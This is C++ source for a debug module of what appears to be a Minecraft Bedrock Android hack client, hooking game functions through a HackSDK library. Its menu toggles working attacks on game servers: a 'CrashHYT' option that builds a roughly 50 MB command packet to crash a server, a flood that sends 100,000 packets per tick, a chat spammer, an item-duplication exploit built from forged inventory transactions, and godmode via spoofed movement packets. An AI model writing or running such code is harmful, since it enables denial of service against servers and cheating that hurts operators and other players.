#include "Debug.h"
#include "HackSDK.h"
#include "MCPE/GameData.h"
#include <algorithm>
#include <jni.h>
#include <iostream>
#include <thread>
#include <fstream>
#include <vector>
#include <sstream>
#include "Android.h"
#include "Utils.hpp"
#include <optional>
#include "Menu.h"

uint64_t(*old_InventoryTransactionManager_addAction)(InventoryTransactionManager*, InventoryAction const&, bool);

uint64_t InventoryTransactionManager_addAction(InventoryTransactionManager* manager, InventoryAction const& action_c, bool idk) {
	Debug* debug = moduleManager->getModule<Debug>();

	InventoryAction& action = (InventoryAction&)action_c;

	if (debug->HookAction == true && manager == &(mGameData.getNowMinecraftGame()->getPrimaryLocalPlayer()->manager)) {
		char Data[1024];
		memset(Data, 0, 1024);
		sprintf(Data, "[Debug]:Hooked InventoryAction %d %d %d %d %d %d bool %d", action.source, (int)(action.sourceType), action.unknown, action.slot, action.getOldItem()->getId(), action.getNowItem()->getId(), (int)idk);
		mGameData.getNowMinecraftGame()->getPrimaryGuiData()->displaySystemMessage(Data, "");
		
		
	}
	return (*old_InventoryTransactionManager_addAction)(manager, action_c, idk);
}

uint64_t(*old_NetworkPacketEventCoordinator_sendPacketReceivedFrom)(void* v1, void* v2, Packet* p);

uint64_t NetworkPacketEventCoordinator_sendPacketReceivedFrom(void* v1, void* v2, Packet* p) {

	Debug* debug = moduleManager->getModule<Debug>();
	
	if (debug->HookRecvPacket == false) {
		return (*old_NetworkPacketEventCoordinator_sendPacketReceivedFrom)(v1, v2, p);
	}

	bool dropped = false;
	if (debug->HookMCPacket == true) {

		Packet* networkPacketPtr = p;

		std::string PacketName = networkPacketPtr->getName();

		std::lock_guard<std::mutex> lck(debug->pk_mutex);
		std::lock_guard<std::mutex> lck1(debug->dpk_mutex);
		bool isFounded = false;
		for (auto it = debug->HidePacketNames.begin(); it != debug->HidePacketNames.end(); it++) {
			if (*it == PacketName) {
				isFounded = true;
				break;
			}
		}
		for (auto it = debug->DropPacketNames.begin(); it != debug->DropPacketNames.end(); it++) {
			if (*it == PacketName) {
				dropped = true;
			}
		}
		if (isFounded == false) {
			if (dropped == false) {
				mGameData.getNowMinecraftGame()->getPrimaryGuiData()->displaySystemMessage("[Debug]Hooked Packet[Recv]: " + PacketName, "");
			}
			else {
				mGameData.getNowMinecraftGame()->getPrimaryGuiData()->displaySystemMessage("[Debug]Hooked Packet(Cannot drop recv packets!)[Recv]: " + PacketName, "");
			}
		}
	}

	return (*old_NetworkPacketEventCoordinator_sendPacketReceivedFrom)(v1, v2, p);
}

void Debug::OnCmd(std::string const& cmd) {
	auto sv = Utils::split(cmd, " ");
	if (sv[0] == ".Spammer") {
		if (sv.size() > 1) {
			if (sv[1] == "false") {
				moduleManager->executedCMD = true;
				spammer_text = "";
			}
			else {
				sv = Utils::split(cmd, "\"");
				if (sv.size() > 1) {
					moduleManager->executedCMD = true;
					spammer_text = sv[1];
				}
			}
		}
	}
}


void Debug::OnCmd(std::vector<std::string>* cmd)
{
	if ((*cmd)[0] == ".HookMCPacket") {
		if (cmd->size() < 2)return;
		if ((*cmd)[1] == "hide") {
			if (cmd->size() < 3)return;
			if ((*cmd)[2] == "rm") {
				if (cmd->size() < 4)return;
				if ((*cmd)[3] == "all") {
					std::lock_guard<std::mutex> lck(pk_mutex);
					moduleManager->executedCMD = true;
					HidePacketNames.clear();
				}
				else {
					moduleManager->executedCMD = true;
					std::lock_guard<std::mutex> lck(pk_mutex);
					for (auto it = HidePacketNames.begin(); it != HidePacketNames.end();) {
						if (*it == (*cmd)[3]) {
							HidePacketNames.erase(it);
						}
						else {
							it++;
						}
					}
				}
			}
			else {
				moduleManager->executedCMD = true;
				std::lock_guard<std::mutex> lck(pk_mutex);
				HidePacketNames.push_back((*cmd)[2]);
			}

		}
		else if ((*cmd)[1] == "drop") {
			if (cmd->size() < 3)return;
			if ((*cmd)[2] == "rm") {
				if (cmd->size() < 4)return;
				if ((*cmd)[3] == "all") {
					std::lock_guard<std::mutex> lck(dpk_mutex);
					moduleManager->executedCMD = true;
					DropPacketNames.clear();
				}
				else {
					moduleManager->executedCMD = true;
					std::lock_guard<std::mutex> lck(dpk_mutex);
					for (auto it = DropPacketNames.begin(); it != DropPacketNames.end();) {
						if (*it == (*cmd)[3]) {
							DropPacketNames.erase(it);
						}
						else {
							it++;
						}
					}
				}
			}
			else {
				moduleManager->executedCMD = true;
				std::lock_guard<std::mutex> lck(dpk_mutex);
				DropPacketNames.push_back((*cmd)[2]);
			}

		}
		else if ((*cmd)[1] == "ShowPacketInfo") {
			if (cmd->size() < 3)return;

			else if ((*cmd)[2] == "true") {
				moduleManager->executedCMD = true;
				showPacketInfo = true;
			}
			else if ((*cmd)[2] == "false") {
				moduleManager->executedCMD = true;
				showPacketInfo = false;
			}
		}
		else if ((*cmd)[1] == "true") {
			moduleManager->executedCMD = true;
			HookMCPacket = true;
		}
		else if ((*cmd)[1] == "false") {
			moduleManager->executedCMD = true;
			HookMCPacket = false;
		}
		else if ((*cmd)[1] == "HookRecvPacket") {
			if (cmd->size() < 3)return;
			else if ((*cmd)[2] == "true") {
				moduleManager->executedCMD = true;
				HookRecvPacket = true;
			}
			else if ((*cmd)[2] == "false") {
				moduleManager->executedCMD = true;
				HookRecvPacket = false;
			}
		}
	}
	else if ((*cmd)[0] == ".HookAction") {
		if (cmd->size() < 2)return;
		if ((*cmd)[1] == "true") {
			moduleManager->executedCMD = true;
			HookAction = true;
		}
		else if ((*cmd)[1] == "false") {
			moduleManager->executedCMD = true;
			HookAction = false;
		}
	}
	else if ((*cmd)[0] == ".killFun") {
		if (cmd->size() < 2)return;
		moduleManager->executedCMD = true;
		uint64_t addr = mGameData.libinfo.head + atoi((*cmd)[1].c_str());
		debugFuns.addFunction(addr);
		debugFuns.killFunction(addr);
	}
	else if ((*cmd)[0] == ".DumpLibList") {
		moduleManager->executedCMD = true;
		std::vector<std::string> libs;
		FILE* fp;
		char lj[64], buff[1024];
		sprintf(lj, "/proc/%d/maps", getpid());
		fp = fopen(lj, "r");
		while (!feof(fp))
		{
			memset(buff, 0, sizeof(buff));
			fgets(buff, sizeof(buff), fp);
			if (!feof(fp) && strstr(buff, "(deleted)") == 0 && strstr(buff, "lib") != 0 && strstr(buff, "/arm") != 0 && strstr(buff, "/data") != 0 && strstr(buff, ".so") != 0)
			{
				char* begin = strstr(buff, "lib");
				char* end = strstr(buff, ".so");
				std::stringstream Name;
				for (char* i = begin; i != end; i = i + 1) {
					Name << *i;
				}
				Name << ".so";
				libs.push_back(Name.str());
			}
		}
		std::sort(libs.begin(), libs.end());
		libs.erase(std::unique(libs.begin(), libs.end()), libs.end());
		fclose(fp);
		std::stringstream Code;
		Code << "std::vector<std::string> TrustLibs = {";
		for (auto it = libs.begin(); it != libs.end(); it = it + 1) {
			Code << "\"" << *it << "\"";
			if (it + 1 != libs.end()) {
				Code << ",";
			}
		}
		std::ofstream infile;
		Code << "};";
		infile.open("/sdcard/MCLibs.txt");
		infile << Code.str();
		infile.close();
	}
	else if ((*cmd)[0] == ".ShowItemID") {
		moduleManager->executedCMD = true;
		std::stringstream os;
		os << "Item ID is : " << mGameData.getNowMinecraftGame()->getPrimaryLocalPlayer()->getSelectedItem()->getId();
		mGameData.getNowMinecraftGame()->getPrimaryGuiData()->displaySystemMessage(os.str(), "");

	}
	else if ((*cmd)[0] == ".Creative") {
		moduleManager->executedCMD = true;
		mGameData.getNowMinecraftGame()->getPrimaryLocalPlayer()->setPlayerGameType(1);
	}
	else if ((*cmd)[0] == ".FetchModel") {
		moduleManager->executedCMD = true;

		auto list = HackSDK::getActorList();
		for (auto i : list) {
			std::stringstream os;
			os << i->getModelName() << " " << i->getPos()->x << " " << i->getPos()->y << " " << i->getPos()->z;
			mGameData.getNowMinecraftGame()->getPrimaryGuiData()->displaySystemMessage(os.str(), "");
		}
	}
	else if ((*cmd)[0] == ".RakNetConnection") {
		moduleManager->executedCMD = true;
		std::stringstream os;
		os << rakNetIP << ":" << rakNetPort;
		mGameData.getNowMinecraftGame()->getPrimaryGuiData()->displaySystemMessage(os.str(), "");
	}
	else if ((*cmd)[0] == ".CopyItem") {
		if (cmd->size() < 2)return;
		moduleManager->executedCMD = true;
		int num = atoi((*cmd)[1].c_str());
		auto lp = mGameData.getNowMinecraftGame()->getPrimaryLocalPlayer();
		ItemStack item(*lp->getSelectedItem());
		for (int i = 0; i != num; i = i + 1) {
			InventorySource source1(2, -1, 0);
			InventoryAction action1(&source1, 0, *mGameData.emptyItem, item);
			lp->manager.addAction(action1, false);

			InventorySource source2(0, 0, 0);
			InventoryAction action2(&source2, lp->getSelectedItemSlot(), item, *mGameData.emptyItem);
			lp->manager.addAction(action2, false);

			lp->updateInventoryTransactions();

			InventorySource source3(0, 0, 0);
			InventoryAction action3(&source3, lp->getSelectedItemSlot(), *mGameData.emptyItem, *mGameData.emptyItem);
			lp->manager.addAction(action3, false);

			InventorySource source4(99999, -5, 0);
			InventoryAction action4(&source4, 0, *mGameData.emptyItem, *mGameData.emptyItem);
			lp->manager.addAction(action4, false);

			InventorySource source5(99999, -5, 0);
			InventoryAction action5(&source5, 0, item, *mGameData.emptyItem);
			lp->manager.addAction(action5, false);

			InventorySource source6(0, 0, 0);
			InventoryAction action6(&source6, lp->getSelectedItemSlot(), *mGameData.emptyItem, item);
			lp->manager.addAction(action6, false);
		}

	}
}

void Debug::OnSendPacket(Packet* packet)
{
	std::string PacketName = packet->getName();
	/*
	if (PacketName == "PyRpcPacket") {
		FILE* fp = fopen("/sdcard/PyRpcPacket", "ab");
		fwrite(((PyRpcPacket*)packet)->data.c_str(), ((PyRpcPacket*)packet)->data.size(), 1, fp);
		char t = '\n';
		fwrite(&t, 1, 1, fp);
		fclose(fp);
	}
	*/
	if (HookMCPacket == false)return;
	std::lock_guard<std::mutex> lck(pk_mutex);
	std::lock_guard<std::mutex> lck1(dpk_mutex);
	bool isFounded = false;
	for (auto it = HidePacketNames.begin(); it != HidePacketNames.end(); it++) {
		if (*it == PacketName) {
			isFounded = true;
			break;
		}
	}

	bool dropped = false;
	for (auto it = DropPacketNames.begin(); it != DropPacketNames.end(); it++) {
		if (*it == PacketName) {
			MCHook::noPacketThisTime = true;
			dropped = true;
			break;
		}
	}
	if (showPacketInfo) {
		if (isFounded == false) {
			if (dropped == false) {
				mGameData.getNowMinecraftGame()->getPrimaryGuiData()->displaySystemMessage("[Debug]Hooked Packet[Send]: " + PacketName, "");
			}
			else {
				mGameData.getNowMinecraftGame()->getPrimaryGuiData()->displaySystemMessage("[Debug]Hooked Packet(Dropped)[Send]: " + PacketName, "");
			}
		}
	}
}

void Debug::OnTick(Actor* m)
{

	LocalPlayer* lp = mGameData.getNowMinecraftGame()->getPrimaryLocalPlayer();
	if (m == lp) {
		if (spammer_text.size() > 0) {
			spammer_tick = spammer_tick + 1;
			if (spammer_tick == 20) {
				spammer_tick = 0;
				srand(time(0));
				int r = rand() % 20;
				std::string end;
				for (int i = 0; i != r; i = i + 1) {
					end.push_back('\n');
				}
				HackSDK::sendOriginalPacket(Text::createChat(mGameData.getNowMinecraftGame()->getPrimaryLocalPlayer()->getName(), spammer_text + end, "1234567", "666"));
			}
		}

		if (godmode) {
			MovePlayerPacket p(*lp, godPos);
			lp->sendNetworkPacket(p);
			lp->sendNetworkPacket(p);
			lp->sendNetworkPacket(p);
			lp->sendNetworkPacket(p);
		}
		else {
			godPos = *lp->getPos();
		}

		if (test) {
			if (hytCrashPacket == nullptr) {
				class CrashPacketCreator {
				public:
					BinaryPacket* create() {

						std::string s;
						std::string word = "死台外迷日中网";
						for (int i = 0; i != 50 * 1024 * 1024 / word.size(); i = i + 1) {
							s.append(word);
						}
						BinaryPacket* packet = new BinaryPacket(0);
						*packet = CommandRequest({ 0,0 }, s, CommandOrigin::CommandOriginPlayer, 0, false, false).write();

						return packet;
					}
				};
				CrashPacketCreator creator;
				hytCrashPacket = creator.create();
			}
			HackSDK::sendBinaryPacket(*hytCrashPacket);

		}
		if (floodPacket) {
			ActorEvent t(lp->getRuntimeID(),57,INT_MAX);
			std::string data = t.write().data;

			for (int i = 0; i != 100000; i = i + 1) {
				HackSDK::sendData(data);
			}
		}
		if (debugButton) {
		}
	}
}


void Debug::OnReceiveData(std::string* data)
{
}


void Debug::OnSendData(std::string* data){

}

void Debug::AfterSendData(std::string* data)
{
	
}





void Debug::createDebugWindow()
{
	Android::Window* win = mAndroid->newWindow();
	win->setOrientation(1);
	win->setCanMove(true);
	Android::TextView* title = mAndroid->newTextView();
	UIUtils::updateTextViewData(title, "GodMode", "#00FF00", 19);
	win->addView(*title);

	Android::TextView* title2 = mAndroid->newTextView();
	UIUtils::updateTextViewData(title2, "CrashHYT", "#00FF00", 19);
	win->addView(*title2);

	Android::TextView* title4 = mAndroid->newTextView();
	UIUtils::updateTextViewData(title4, "FloodPacket", "#00FF00", 19);
	win->addView(*title4);


	Android::TextView* title5 = mAndroid->newTextView();
	UIUtils::updateTextViewData(title5, "DebugButton", "#00FF00", 19);
	win->addView(*title5);

	title5->setOnClickListener([=](Android::View*) {

		if (debugButton == false) {
			mAndroid->Toast("DebugButton true");
			debugButton = true;
		}
		else {
			mAndroid->Toast("DebugButton false");
			debugButton = false;
		}
		});

	title->setOnClickListener([=](Android::View*) {

		if (godmode == false) {
			mAndroid->Toast("godmode true");
			godmode = true;
		}
		else {
			mAndroid->Toast("godmode false");
			godmode = false;
		}
	});

	title2->setOnClickListener([=](Android::View*) {
		
		if (test == false) {
			mAndroid->Toast("attack_hyt true");
			test = true; 

		}
		else {
			mAndroid->Toast("attack_hyt false");
			test = false;
		}
	});

	title4->setOnClickListener([=](Android::View*) {

		if (floodPacket == false) {
			mAndroid->Toast("FloodPacket true");
			floodPacket = true;

		}
		else {
			mAndroid->Toast("FloodPacket false");
			floodPacket = false;
		}
	});
}

void Debug::UiInit()
{
	createDebugWindow();
}

void* (*old_LCNH_handleM)(void* ClientNetworkHandler, void* NetworkIdentifier, MovePlayerPacket const& _packet);

void* LCNH_handleM(void* ClientNetworkHandler, void* NetworkIdentifier, MovePlayerPacket const& _packet) {

	MovePlayerPacket* p = (MovePlayerPacket*)&_packet;
	LocalPlayer* lp = mGameData.getNowMinecraftGame()->getPrimaryLocalPlayer();
	if(lp){
		if (lp->getRuntimeID() == p->eid && moduleManager->getModule<Debug>()->godmode) {
			p->mode = 0;
		}
	}
	return (*old_LCNH_handleM)(ClientNetworkHandler, NetworkIdentifier, _packet);
}

uint64_t (*old_const_RakNet_RakPeer_Connect)(void* thiz, char const* ip, unsigned short port, char const* a1, int a2, void* a3, uint32_t a4, uint32_t a5, uint32_t a6, uint32_t a7);
uint64_t const_RakNet_RakPeer_Connect(void* thiz, char const* ip, unsigned short port, char const* a1, int a2, void* a3, uint32_t a4, uint32_t a5, uint32_t a6, uint32_t a7) {
	moduleManager->getModule<Debug>()->rakNetIP = ip;
	moduleManager->getModule<Debug>()->rakNetPort = port;
	return (*old_const_RakNet_RakPeer_Connect)(thiz, ip, port, a1, a2, a3, a4, a5, a6, a7);
}


void Debug::MinecraftInit()
{
	HackSDK::FastHook(mGameData.basePtr.LCNH_handle_MovePlayerPacket, (void*)LCNH_handleM, (void**)&old_LCNH_handleM);
	HackSDK::FastHook(mGameData.basePtr.RakNet_RakPeer_Connect, (void*)const_RakNet_RakPeer_Connect, (void**)&old_const_RakNet_RakPeer_Connect);
	HackSDK::FastHook(mGameData.basePtr.NetworkPacketEventCoordinator_sendPacketReceivedFrom, (void*)NetworkPacketEventCoordinator_sendPacketReceivedFrom, (void**)&old_NetworkPacketEventCoordinator_sendPacketReceivedFrom);
	HackSDK::FastHook(mGameData.basePtr.InventoryTransactionManager_addAction, (void*)InventoryTransactionManager_addAction, (void**)&old_InventoryTransactionManager_addAction);
}

